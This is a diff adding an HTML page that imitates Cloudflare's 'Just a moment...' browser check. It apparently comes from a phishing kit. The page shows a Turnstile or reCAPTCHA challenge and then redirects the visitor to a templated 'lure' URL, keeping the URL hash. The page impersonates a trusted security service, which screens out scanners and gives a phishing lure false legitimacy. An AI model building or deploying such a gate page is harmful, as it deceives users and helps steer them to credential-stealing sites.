@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
+    <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>
+
+    <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <script>
+      window.onloadCallback = function () {
+        widgetId1 = grecaptcha.render("reCaptcha", {
+          sitekey: "{ recaptcha_sitekey }",
+          callback: verifyCallback,
+          theme: "auto",
+          "expired-callback": refreshCallBack,
+          "error-callback": refreshCallBack,
+        })
+      }
+    </script>
+    <script>
+      window.onloadTurnstileCallback = function () {
+        turnstile.render("#turnstileCaptcha", {
+          sitekey: "{ turnstile_sitekey }",
+          callback: function (token) {
+            verifyCallback()
+          },
+          // 'expired-callback': refreshCallBack,
+          // 'error-callback': switchToGoogleCaptcha(),
+        })
+      }
+    </script>
+    <script type="text/javascript">
+      var verifyCallback = function (response) {
+        window.location.href = { lure_url_js } + window.location.hash
+      }
+
+      window.switchToGoogleCaptcha = function () {
+        setTimeout(function () {
+          const cfForm = document.querySelector("#cfForm")
+          cfForm.style.visibility = "hidden"
+          cfForm.remove()
+          setTimeout(() => {
+            document.querySelector("#gForm").style.visibility = "visible"
+          }, 500)
+        }, 10000)
+      }
+
+      var refreshCallBack = function (response) {
+        setTimeout(function () {
+          window.location.reload()
+        }, 1000)
+      }
+
+      setInterval(function () {
+        if (document.querySelector("#cfForm").style.visibility == "visible" && document.querySelector("#gForm").style.visibility == "hidden") {
+          switchToGoogleCaptcha()
+        }
+      }, 10000)
+    </script>
+  </head>
+  <!-- #endregion -->
+
+  <body class="no-js">
+    <div class="main-wrapper" role="main">
+      <div class="main-content">
+        <h1 class="zone-name-title h1">
+          <div>
+            <div id="site-name"></div>
+          </div>
+        </h1>
+        <noscript>
+          <div id="challenge-error-title">
+            <div class="h2">
+              <span class="icon-wrapper">
+                <div class="heading-icon warning-icon"></div>
+              </span>
+              <span id="challenge-error-text"> Enable JavaScript and cookies to continue </span>
+            </div>
+          </div>
+        </noscript>
+        <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking your browser...</p>
+        <form action="?" method="POST" id="gForm" style="visibility: hidden">
+          <div id="reCaptcha"></div>
+          <br />
+        </form>
+        <form action="?" method="POST" id="cfForm" style="visibility: visible">
+          <div id="turnstileCaptcha"></div>
+          <br />
+        </form>
+      </div>
+    </div>
+    <script></script>
+  </body>
+</html>
